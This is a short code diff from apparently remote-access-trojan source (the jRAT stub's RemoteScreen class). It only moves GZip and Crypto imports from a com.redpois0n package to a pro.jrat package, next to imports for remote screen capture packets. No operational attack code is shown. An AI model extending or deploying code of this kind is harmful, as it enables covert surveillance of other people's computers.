@@ -10,14 +10,14 @@ import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.io.DataOutputStream;
 
+import pro.jrat.common.compress.GZip;
+import pro.jrat.common.crypto.Crypto;
 import pro.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import pro.jrat.stub.packets.outgoing.Packet17RemoteScreen;
 import pro.jrat.stub.packets.outgoing.Packet18OneRemoteScreen;
 import pro.jrat.stub.packets.outgoing.Packet33Thumbnail;
 import pro.jrat.stub.utils.ImageUtils;
 
-import com.redpois0n.common.compress.GZip;
-import com.redpois0n.common.crypto.Crypto;
 
 public class RemoteScreen {
 
